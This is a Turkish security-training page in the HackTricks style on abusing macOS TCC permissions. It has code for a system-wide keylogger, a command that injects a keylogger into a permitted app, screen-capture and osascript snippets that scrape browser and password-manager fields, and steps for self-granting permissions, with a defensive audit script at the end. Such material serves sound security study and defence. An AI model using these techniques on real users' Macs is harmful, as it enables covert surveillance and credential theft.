# macOS Input Monitoring, Screen Capture ve Accessibility Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Birbiriyle ilişkili üç TCC service, uygulamaların kullanıcının masaüstü oturumunu nasıl gözlemleyebileceğini ve onunla nasıl etkileşime girebileceğini kontrol eder:

| TCC Service | İzin | Yetenek |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | Sistem genelindeki tüm klavye ve fare olaylarını okuma (keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | Sentetik klavye ve fare olayları enjekte etme |
| `kTCCServiceScreenCapture` | **Screen Capture** | Görüntü arabelleğini okuma, ekran görüntüsü alma ve ekranı kaydetme |
| `kTCCServiceAccessibility` | **Accessibility** | AXUIElement API aracılığıyla diğer uygulamaları kontrol etme ve UI öğelerini okuma |

Bu izinler macOS'taki **en tehlikeli kombinasyondur** — birlikte şunları sağlar:
- Her tuş vuruşunun tamamen keylogging ile kaydedilmesi (parolalar, mesajlar, kredi kartları)
- Görünen tüm içeriklerin ekran kaydının alınması
- Sentetik girdi enjeksiyonu (düğmelere tıklama, iletişim kutularını onaylama)
- Fiziksel erişime eşdeğer eksiksiz GUI kontrolü

---

## Input Monitoring (kTCCServiceListenEvent)

### Nasıl Çalışır?

macOS, süreçlerin Quartz event system içindeki girdi olaylarını yakalamasına olanak sağlamak için **`CGEventTap` API**'sini kullanır. ListenEvent iznine sahip bir süreç, hedef uygulamaya ulaşmadan önce veya ulaştıktan sonra **her klavye ve fare olayını** alan bir event tap oluşturabilir.<sup>[1]</sup>
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Yetkilendirilmiş Binary'leri Bulma
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Saldırı: Code Injection ile Keylogging

ListenEvent iznine sahip bir binary'de **disabled library validation** varsa veya **DYLD environment variables** kullanımına izin veriliyorsa, saldırgan bir CGEventTap kaydeden dylib enjekte edebilir:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
Enjekte edilen dylib, hedefin ListenEvent TCC grant'ini devralır ve tüm tuş vuruşlarını yakalar.

### Attack: Credential Harvesting

Gelişmiş bir keylogger, tuş vuruşlarını etkin uygulamayla ilişkilendirebilir:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Girdi Enjeksiyonu (kTCCServicePostEvent)

### Nasıl Çalışır

PostEvent izni, ListenOnly yerine **`kCGEventTapOptionDefault`** (olayları değiştirebilir/enjekte edebilir) ile bir event tap oluşturulmasına izin verir.<sup>[1]</sup> Bu şunları sağlar:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Saldırı: Automated TCC Prompt Approval

PostEvent ile saldırgan, TCC izin iletişim kutularında **"Allow" seçeneğine tıklamayı simüle edebilir**:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Ekran Yakalama (kTCCServiceScreenCapture)

### Nasıl Çalışır

Ekran yakalama izni, aşağıdakileri kullanarak ekran arabelleğinin okunmasına olanak tanır:
- **`CGWindowListCreateImage`** — herhangi bir pencereyi veya tam ekranı yakalama
- **`ScreenCaptureKit`** (macOS 12.3+) — ekran içeriğini streaming için modern API<sup>[3]</sup>
- **`CGDisplayStream`** — donanım hızlandırmalı ekran yakalama
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Ekran Yakalama İstemcilerini Bulma
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Saldırı: OCR ile Kimlik Bilgisi Yakalama

Enjekte edilmiş bir screen capture process, belirli aralıklarla ekran görüntülerini yakalayabilir ve parolaları çıkarmak için OCR kullanabilir:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> **macOS Sonoma** ile birlikte ekran yakalama, menü çubuğunda **kalıcı bir gösterge** görüntüler. Daha eski sürümlerde ekran kaydı tamamen sessiz olabilir. Ancak kısa süreli, tek karelik bir yakalama yine de kullanıcılar tarafından fark edilmeyebilir.

### Saldırı: Oturum Kaydı

Sürekli ekran kaydı, kullanıcının oturumunun eksiksiz bir tekrarını sağlar:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Accessibility (kTCCServiceAccessibility)

### Nasıl Çalışır

Accessibility erişimi, **AXUIElement API** aracılığıyla diğer uygulamalar üzerinde kontrol sağlar.<sup>[2]</sup> Accessibility erişimine sahip bir işlem şunları yapabilir:

1. Herhangi bir uygulamadaki tüm UI öğelerini okuyabilir (metin alanları, etiketler, düğmeler, menüler)
2. Düğmelere tıklayabilir ve kontrollerle etkileşim kurabilir
3. Herhangi bir metin alanına metin yazabilir
4. Menülerde ve iletişim kutularında gezinebilir
5. Çalışan herhangi bir uygulamada görüntülenen verileri **scrape** edebilir
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Attack: Self-Granting TCC Permissions

En tehlikeli accessibility abuse, **kendi malware'inize ek permissions vermek için System Settings'te gezinmektir**:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Attack: Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Saldırı: Otomatikleştirilmiş Kullanıcı Eylemleri
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Saldırı Zincirleri

### Zincir: Input Monitoring + Screen Capture = Tam Gözetim
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Zincir: Erişilebilirlik + PostEvent = Tam Uzaktan Kontrol
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Zincir: Erişilebilirlik → Kamera/Mikrofon İzinlerini Kendine Verme → Gözetim
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Tespit ve Enumerasyon
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## Referanslar

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
